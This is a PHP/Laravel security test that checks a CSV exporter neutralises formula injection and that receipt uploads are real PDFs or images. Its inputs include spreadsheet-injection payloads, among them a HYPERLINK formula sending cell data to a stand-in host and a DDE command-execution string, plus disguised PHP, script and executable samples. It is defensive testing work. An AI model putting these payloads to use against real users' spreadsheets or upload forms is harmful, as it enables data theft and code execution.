<?php

namespace Tests\Feature;

use App\Models\CategoriaDespesaTempo;
use App\Models\DespesaTempo;
use App\Services\Tempos\GestorDespesas;
use App\Support\Csv;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\Storage;
use Illuminate\Validation\ValidationException;
use Tests\TestCase;

// Revisão de segurança, lote 2 (notas §45): o que entra e sai em ficheiros — fórmulas nos CSV e
// recibos que só o são no nome.
class SegurancaFicheirosTest extends TestCase
{
    use RefreshDatabase;

    public function test_csv_neutraliza_formulas_e_deixa_os_numeros(): void
    {
        $casos = [
            // Texto que o Excel executaria: leva apóstrofo.
            '=HYPERLINK("http://mau.pt/?d="&A2;"Ver recibo")' => '\'=HYPERLINK("http://mau.pt/?d="&A2;"Ver recibo")',
            '+cmd|\'/c calc\'!A1' => '\'+cmd|\'/c calc\'!A1',
            '-2+3+cmd|x' => '\'-2+3+cmd|x',
            '@SUM(1+1)' => '\'@SUM(1+1)',
            "\t=1+1" => "'\t=1+1",
            "\r=1+1" => "'\r=1+1",
            '- portagens' => '\'- portagens',
            // Números, horas e valores (também negativos): ficam números.
            '-1:30:00' => '-1:30:00',
            '+1:30:00' => '+1:30:00',
            '-12,50' => '-12,50',
            '1 234,50' => '1 234,50',
            '7,5' => '7,5',
            // Texto normal: igual.
            'Portagens A28' => 'Portagens A28',
            'Hospital da Luz (demo)' => 'Hospital da Luz (demo)',
            '' => '',
        ];
        foreach ($casos as $entrada => $saida) {
            $this->assertSame($saida, Csv::celula($entrada), 'entrada: '.json_encode($entrada));
        }
        $this->assertSame(12, Csv::celula(12));
        $this->assertNull(Csv::celula(null));

        // O ficheiro a sério.
        ob_start();
        Csv::resposta('x.csv', ['Nota', 'Valor (€)'], [['=2+2', '-12,50'], ['Almoço', '8,40']])->sendContent();
        $csv = ob_get_clean();
        $this->assertStringContainsString("'=2+2;-12,50", $csv);
        $this->assertStringContainsString('Almoço;8,40', $csv);
    }

    public function test_recibos_so_passam_se_forem_mesmo_pdf_ou_imagem(): void
    {
        Carbon::setTestNow('2026-09-17 10:00:00');
        Storage::fake(DespesaTempo::DISCO);
        $ana = $this->tecnico();
        $gestor = app(GestorDespesas::class);
        $lancar = fn (UploadedFile $recibo) => $gestor->criar($ana, ['data' => '2026-09-15', 'valor' => '10', 'categoria_id' => CategoriaDespesaTempo::first()->id], $recibo);

        // Disfarçados: o nome diz PDF ou imagem, o conteúdo não é.
        $disfarcados = [
            'fatura.pdf' => '<?php echo "não sou um recibo"; ?>', // PHP disfarçado de PDF (uma webshell a sério era apagada pelo antivírus do PC)
            'talao.jpg' => '<html><script>alert(1)</script></html>',
            'recibo.png' => "MZ\x90\x00 programa do Windows",
            'vazio.pdf' => str_repeat("\0", 2048),
        ];
        foreach ($disfarcados as $nome => $conteudo) {
            try {
                $lancar(UploadedFile::fake()->createWithContent($nome, $conteudo));
                $this->fail($nome.' não é um recibo a sério.');
            } catch (ValidationException $e) {
                $this->assertSame('O recibo tem de ser PDF ou imagem (JPG, PNG, WEBP, HEIC).', $e->errors()['recibo'][0], $nome);
            }
        }
        $this->assertSame(0, DespesaTempo::count(), 'nada foi gravado');

        // A sério: passam.
        $verdadeiros = [
            'fatura.pdf' => "%PDF-1.4\n1 0 obj\n<<>>\nendobj\ntrailer\n<<>>\n%%EOF\n",
            'talao.jpg' => "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9",
            'talao.png' => "\x89PNG\r\n\x1a\n\x00\x00\x00\x0dIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89",
            'talao.webp' => "RIFF\x1a\x00\x00\x00WEBPVP8L\x0d\x00\x00\x00\x2f\x00\x00\x00\x10\x07\x10\x11\x11\x88\x88\xfe\x07\x00",
            'IMG_0001.heic' => "\x00\x00\x00\x18ftypheic\x00\x00\x00\x00mif1heic\x00\x00\x00\x00",
        ];
        foreach ($verdadeiros as $nome => $conteudo) {
            $d = $lancar(UploadedFile::fake()->createWithContent($nome, $conteudo));
            $this->assertSame($nome, $d->recibo_nome);
            Storage::disk(DespesaTempo::DISCO)->assertExists($d->recibo_caminho);
        }
    }
}
